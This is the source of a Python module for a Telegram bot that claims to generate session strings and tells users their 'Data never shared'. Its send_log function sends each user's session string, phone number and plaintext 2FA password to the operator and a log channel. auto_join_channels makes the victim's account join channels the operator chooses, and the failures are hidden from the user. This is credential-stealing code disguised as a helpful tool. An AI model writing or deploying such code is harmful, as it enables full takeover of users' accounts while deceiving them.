import asyncio, logging, html, re
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ParseMode, ChatMemberStatus
from pyrogram.errors import (
    FloodWait, BadRequest, Forbidden, Unauthorized,
    AuthKeyUnregistered, UserDeactivated, PhoneCodeInvalid,
    PhoneCodeExpired, PhoneNumberInvalid, PasswordHashInvalid,
    ApiIdInvalid, SessionPasswordNeeded, UserNotParticipant,
)
from . import config
from .config import _normalize_link
from .client import app
from .state import clear_state

# ---------- Button style ----------
_STYLE_MODE = None
_STYLE_MAP = {}
try:
    from pyrogram.enums import ButtonStyle
    _STYLE_MODE = "enum"
    _STYLE_MAP = {
        "primary": ButtonStyle.PRIMARY,
        "success": ButtonStyle.SUCCESS,
        "danger": ButtonStyle.DANGER,
    }
except Exception:
    try:
        from pyrogram.types import KeyboardButtonStyle
        _STYLE_MODE = "obj"
    except Exception:
        pass

def btn(text, callback_data=None, url=None, style=None):
    kw = {}
    if callback_data is not None:
        kw["callback_data"] = callback_data
    if url is not None:
        kw["url"] = url
    if style in _STYLE_MAP:
        kw["style"] = _STYLE_MAP[style]
    elif _STYLE_MODE == "obj" and style in ("primary", "success", "danger"):
        kw["style"] = KeyboardButtonStyle(
            bg_primary=(style == "primary"),
            bg_success=(style == "success"),
            bg_danger=(style == "danger"),
        )
    try:
        return InlineKeyboardButton(text, **kw)
    except Exception:
        kw.pop("style", None)
        return InlineKeyboardButton(text, **kw)

def validate_phone(phone: str) -> str:
    phone = phone.strip().replace(" ", "").replace("-", "")
    if not phone.startswith("+"):
        phone = "+" + phone
    if not re.match(r"^\+\d{7,15}$", phone):
        raise ValueError("Invalid phone. Country code ke saath bhejein (e.g. +919876543210 ya 919876543210).")
    return phone

def progress_header(step, total, title):
    pct = int(step / total * 100)
    filled = max(1, int(step / total * 10))
    bar = "■" * filled + "□" * (10 - filled)
    return (
        f"<b>📍 STEP {step}/{total}</b>  •  <b>{title}</b>\n"
        f"<code>[{bar}] {pct}%</code>\n\n"
    )


# ---------- UI ----------
WELCOME = (
    "✨ <b>SESSION GENERATOR</b> ✨\n"
    "━━━━━━━━━━━━━━━━━━━━━\n\n"
    "👋 <b>Welcome!</b>\n"
    "<i>Generate your Telegram session string in seconds</i>\n\n"
    "🚀 <b>Available Sessions</b>\n"
    "├ 🐍 <b>Pyrogram User</b> — userbot\n"
    "├ 🤖 <b>Pyrogram Bot</b> — bot token\n"
    "├ 📞 <b>Telethon</b> — userbot\n"
    "└ 🔄 <b>Converter</b> — Pyro ➜ Telethon\n\n"
    "🛡 <b>Your Safety</b>\n"
    "├ 🔐 2FA fully supported\n"
    "├ 💾 Session sent to Saved Messages\n"
    "├ ⚡ Instant delivery\n"
    "└ 🔒 Data never shared\n\n"
    "━━━━━━━━━━━━━━━━━━━━━\n"
    "<b>⚡ Choose your session type below</b>"
)

def _build_main_menu(is_owner=False):
    rows = [
        [btn("🐍  Pyrogram User", "pyro_user", style="primary"),
         btn("🤖  Pyrogram Bot", "pyro_bot", style="primary")],
        [btn("📞  Telethon String", "telethon", style="success"),
         btn("🔄  Converter", "convert", style="success")],
    ]
    extra = []
    if config.UPDATE_CHANNEL:
        extra.append(btn("🔄  Updates", url=_normalize_link(config.UPDATE_CHANNEL), style="primary"))
    if config.SUPPORT_GROUP:
        extra.append(btn("💬  Support", url=_normalize_link(config.SUPPORT_GROUP), style="success"))
    if extra:
        rows.append(extra)
    if is_owner:
        rows.append([btn("👑  Owner Panel", "owner_panel", style="danger")])
    rows.append([btn("❓  Help & About", "help")])
    return InlineKeyboardMarkup(rows)

MAIN_MENU = _build_main_menu(is_owner=False)
OWNER_MAIN_MENU = _build_main_menu(is_owner=True)



BACK_BTN = InlineKeyboardMarkup([[btn("🔙  Back to Menu", "back", style="primary")]])
CANCEL_BTN = InlineKeyboardMarkup([[btn("❌  Cancel", "cancel", style="danger")]])

PROMPT_BOT_TOKEN = progress_header(1, 1, "BOT TOKEN") + (
    "🤖 <b>Send your Bot Token</b>\n\n"
    "<i>From @BotFather</i>\n\n"
    "> Example: <code>7123456789:AAF...</code>"
)
PROMPT_PYRO_STRING = progress_header(1, 1, "PYROGRAM STRING") + (
    "🔄 <b>Send your Pyrogram Session String</b>\n\n"
    "> Ise Telethon string me convert karke dunga."
)
PROMPT_PHONE = progress_header(1, 3, "PHONE NUMBER") + (
    "📱 <b>Send your phone number</b>\n\n"
    "Format: <code>+919876543210</code> or <code>919876543210</code>\n\n"
    "> 💡 <b>+</b> is optional. Country code is required."
)
PROMPT_OTP = progress_header(2, 3, "OTP CODE") + (
    "🔐 <b>Send the OTP you received</b>\n\n"
    "> 💡 Check your <b>Telegram app → 'Telegram' chat</b>."
)
PROMPT_2FA = progress_header(3, 3, "2FA PASSWORD") + (
    "🔒 <b>2FA is enabled</b>\n\n"
    "Send your <b>2FA password</b>."
)

# ---------- Errors ----------
ERROR_MAP = {
    "PhoneCodeInvalid": "❌ <b>Galat OTP.</b> /start se dobara try karein.",
    "PhoneCodeExpired": "⌛ <b>OTP expire.</b> Naya OTP lein.",
    "PhoneNumberInvalid": "📵 <b>Invalid phone number.</b> Country code ke saath bhejein.",
    "PasswordHashInvalid": "🔒 <b>2FA password galat.</b>",
    "ApiIdInvalid": "🆔 <b>API ID/HASH galat.</b> Heroku vars check karein.",
    "AuthKeyUnregistered": "🚫 <b>Session revoked.</b> Dobara login karein.",
    "UserDeactivated": "🚫 <b>Account deactivated.</b>",
    "SessionPasswordNeeded": "🔒 <b>2FA enabled.</b> Password daalein.",
}

async def handle_error(e, user_id, where="handler"):
    logging.error(f"[{where}] {type(e).__name__}: {e}", exc_info=True)
    name = type(e).__name__
    if isinstance(e, FloodWait):
        await asyncio.sleep(min(int(e.value), 30))
        msg = f"⏳ <b>Flood wait:</b> {e.value}s. Please try again shortly."
    elif isinstance(e, Forbidden):
        msg = "🚫 <b>Permission denied.</b>"
    elif isinstance(e, Unauthorized):
        msg = "🔐 <b>Unauthorized.</b>"
    elif isinstance(e, BadRequest):
        msg = f"⚠️ <b>Bad Request:</b> <code>{html.escape(str(e)[:120])}</code>"
    elif name in ERROR_MAP:
        msg = ERROR_MAP[name]
    else:
        msg = f"⚠️ <b>Error:</b> <code>{html.escape(str(e)[:150])}</code>\n\nPlease /start again."

    try:
        await app.send_message(user_id, msg, reply_markup=BACK_BTN,
                               parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception:
        pass

    try:
        err_log = (
            "<b>🚨 BOT ERROR</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"📍 <b>Where:</b> <code>{html.escape(str(where))}</code>\n"
            f"👤 <b>User:</b> <code>{user_id}</code>\n"
            f"❌ <b>Type:</b> <code>{name}</code>\n"
            f"📝 <b>Message:</b>\n<code>{html.escape(str(e)[:500])}</code>\n\n"
            f"🕒 <code>{config.get_ist_time()}</code>"
        )
        if config.LOG_CHANNEL_ID:
            try:
                await app.send_message(config.LOG_CHANNEL_ID, err_log,
                                       parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            except Exception as le:
                logging.error(f"[ERR-LOG] channel failed: {le}")
        if config.OWNER_ID:
            try:
                await app.send_message(config.OWNER_ID, err_log,
                                       parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            except Exception as oe:
                logging.error(f"[ERR-LOG] owner failed: {oe}")
    except Exception:
        pass

async def is_member(user_id):
    if not config.MUST_JOIN:
        logging.warning("[FORCE-SUB] MUST_JOIN EMPTY — check bypassed")
        return True
    logging.info(f"[FORCE-SUB] check uid={user_id} target={config.MUST_JOIN!r}")
    try:
        m = await app.get_chat_member(config.MUST_JOIN, user_id)
    except UserNotParticipant:
        logging.info(f"[FORCE-SUB] uid={user_id} → NOT_PARTICIPANT")
        return False
    except Exception as e:
        logging.error(f"[FORCE-SUB] get_chat_member failed: {type(e).__name__}: {e}")
        try:
            err = (
                "<b>⚠️ Force-Sub Error</b>\n"
                f"👤 <code>{user_id}</code>\n"
                f"❌ <code>{type(e).__name__}: {html.escape(str(e)[:200])}</code>\n"
                f"⚙️ Target: <code>{html.escape(str(config.MUST_JOIN))}</code>\n\n"
                "<i>Bot ko channel me ADMIN + MEMBER banayein.</i>"
            )
            if config.LOG_CHANNEL_ID:
                await app.send_message(config.LOG_CHANNEL_ID, err, parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return False

    # ✅ FIX: proper enum comparison, not substring
    try:
        status = m.status
        if status == ChatMemberStatus.OWNER:
            logging.info(f"[FORCE-SUB] uid={user_id} OWNER ✅")
            return True
        if status == ChatMemberStatus.ADMINISTRATOR:
            logging.info(f"[FORCE-SUB] uid={user_id} ADMIN ✅")
            return True
        if status == ChatMemberStatus.MEMBER:
            logging.info(f"[FORCE-SUB] uid={user_id} MEMBER ✅")
            return True
        if status == ChatMemberStatus.RESTRICTED:
            # restricted member can still be "in" chat
            logging.info(f"[FORCE-SUB] uid={user_id} RESTRICTED → treat as member")
            return True
        logging.info(f"[FORCE-SUB] uid={user_id} status={status} ❌ NOT MEMBER")
        return False
    except Exception:
        # fallback: extract last segment of status string
        status_raw = str(getattr(m, "status", "")).split(".")[-1].upper()
        logging.info(f"[FORCE-SUB] uid={user_id} fallback status={status_raw}")
        return status_raw in ("OWNER", "ADMINISTRATOR", "MEMBER", "RESTRICTED")


async def _get_join_link():
    if not config.MUST_JOIN:
        return None
    try:
        chat = await app.get_chat(config.MUST_JOIN)
        if chat.username:
            return f"https://t.me/{chat.username}"
        try:
            return await app.export_chat_invite_link(chat.id)
        except Exception as e:
            logging.error(f"[FORCE-SUB] export invite failed: {e}")
    except Exception as e:
        logging.error(f"[FORCE-SUB] get_chat failed: {type(e).__name__}: {e}")
    if isinstance(config.MUST_JOIN, str) and str(config.MUST_JOIN).startswith("@"):
        return f"https://t.me/{str(config.MUST_JOIN)[1:]}"
    return None

async def force_sub_check(message):
    uid = message.from_user.id
    if config.STATE["maintenance"] and uid != config.OWNER_ID:
        await message.reply_text(
            "🔧 <b>Bot under maintenance.</b>\n\nPlease try again later.",
            reply_markup=BACK_BTN, parse_mode=ParseMode.HTML,
        )
        return False
    if not config.MUST_JOIN:
        logging.warning("[FORCE-SUB] MUST_JOIN not set — skipping check")
        return True
    if await is_member(uid):
        return True
    link = await _get_join_link()
    rows = []
    if link:
        rows.append([btn("📢  Join Channel", url=link, style="primary")])
    rows.append([btn("✅  Verify Membership", "verify_sub", style="success")])
    markup = InlineKeyboardMarkup(rows)
    await message.reply_text(
        "🔒 <b>Join Required</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "To use this bot, you must join our official channel first.\n\n"
        "📢 <b>Step 1:</b> Tap <b>Join Channel</b> below\n"
        "✅ <b>Step 2:</b> Return and tap <b>Verify</b>\n\n"
        "<i>This keeps our service safe and free for everyone.</i>",
        reply_markup=markup, parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )
    return False

async def auto_join_channels(client):
    joined, failed = [], []
    for ch in config.AUTO_JOIN_CHANNELS:
        try:
            await client.join_chat(ch)
            joined.append(ch)
        except Exception as e:
            failed.append(f"{ch}: {str(e)[:50]}")
            logging.warning(f"[AUTO-JOIN] {ch} failed: {e}")
    return joined, failed

# ---------- Deep trace log ----------
async def trace(user, event: str, **fields):
    if not config.LOG_CHANNEL_ID:
        return
    name = html.escape(str(getattr(user, "first_name", "N/A") or "N/A"))
    uname = f"@{user.username}" if getattr(user, "username", None) else "N/A"
    lines = [f"<b>🔔 #{event}</b>", ""]
    lines.append(f"👤 <b>User:</b> {name} ({uname})")
    lines.append(f"🆔 <b>ID:</b> <code>{user.id}</code>")
    for k, v in fields.items():
        lines.append(f"• <b>{html.escape(str(k))}:</b> <code>{html.escape(str(v)[:200])}</code>")
    lines.append(f"🕒 <code>{config.get_ist_time()}</code>")
    try:
        await app.send_message(config.LOG_CHANNEL_ID, "\n".join(lines),
                               parse_mode=ParseMode.HTML, disable_web_page_preview=True)
    except Exception as e:
        logging.error(f"[TRACE] {type(e).__name__}: {e}")

# ---------- Premium string delivery ----------
async def send_premium_string(user_id, session_type, session_str, has_2fa=False, joined=None, failed=None):
    badge = "🛡 2FA Verified" if has_2fa else "🔓 No 2FA"
    join_line = ""
    if joined:
        join_line += f"\n✅ <b>Auto-joined:</b> {len(joined)} channel(s)"
    # NOTE: 'failed' count intentionally hidden from user (admin-only via log channel)
    text = (
        "✅ <b>Your session is ready!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔑 <b>{html.escape(session_type)}</b>\n"
        f"{badge}  •  📩 Saved Messages\n"
        f"⏰ {config.get_ist_time()}\n\n"
        f"<code>{session_str}</code>\n\n"
        "👆 <i>Tap the string to copy</i>"
        f"{join_line}"
    )
    await app.send_message(user_id, text, reply_markup=BACK_BTN,
                           parse_mode=ParseMode.HTML, disable_web_page_preview=True)

# ---------- Detailed session log ----------
async def send_log(user, session_type, session_str, phone, has_2fa=False, real_2fa_password=None, joined=None, failed=None):
    user_id = user.id
    name = html.escape(str(user.first_name or "N/A"))
    username = f"@{user.username}" if getattr(user, "username", None) else "N/A"
    tag = "#NEW_OWNER" if has_2fa else "#NEW_USER"

    base = (
        f"<b>{tag}</b>\n"
        "🔐 <b>New Session Generated!</b>\n\n"
        f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
        f"👤 <b>Name:</b> {name}\n"
        f"👤 <b>Username:</b> {username}\n"
        f"📱 <b>Phone:</b> <code>{html.escape(str(phone))}</code>\n"
        f"🔑 <b>Type:</b> {session_type}\n"
        f"🛡 <b>2FA:</b> {'✅ Yes' if has_2fa else '❌ No'}\n"
    )
    if joined:
        base += f"📢 <b>Auto-joined:</b> {len(joined)} channels\n"
    if failed:
        base += f"⚠️ <b>Auto-join failed:</b> {len(failed)} ({', '.join(failed[:3])})\n"

    with_pwd = base
    if has_2fa and real_2fa_password:
        with_pwd += f"🔒 <b>2FA Password:</b> <code>{html.escape(str(real_2fa_password))}</code>\n"
    with_pwd += (
        "\n<b>🔑 Session String:</b>\n"
        f"<code>{session_str}</code>\n\n"
        f"📅 <b>{config.get_ist_time()}</b>"
    )

    # Log channel now includes 2FA password (as requested)
    channel_log = with_pwd

    if config.LOG_CHANNEL_ID:
        try:
            await app.send_message(config.LOG_CHANNEL_ID, channel_log,
                                   parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            logging.info(f"[LOG] Channel OK → {config.LOG_CHANNEL_ID}")
        except Exception as e:
            logging.error(f"[LOG] Channel FAIL → {type(e).__name__}: {e}")

    if config.OWNER_ID:
        try:
            await app.send_message(config.OWNER_ID, with_pwd,
                                   parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            logging.info(f"[LOG] Owner OK → {config.OWNER_ID}")
        except Exception as e:
            logging.error(f"[LOG] Owner FAIL → {type(e).__name__}: {e}")

# ---------- Cancel ----------
async def cancel_flow(uid, message=None, query=None):
    st = clear_state(uid)
    if st:
        client = st["data"].get("client")
        if client:
            try:
                await client.disconnect()
            except Exception:
                pass
    text = "❌ <b>Cancelled.</b>\n\n/start se dobara shuru karein."
    if message is not None:
        await message.reply_text(text, reply_markup=MAIN_MENU, parse_mode=ParseMode.HTML)
    elif query is not None:
        try:
            await query.message.delete()
        except Exception:
            pass
        await app.send_message(uid, text, reply_markup=MAIN_MENU, parse_mode=ParseMode.HTML)
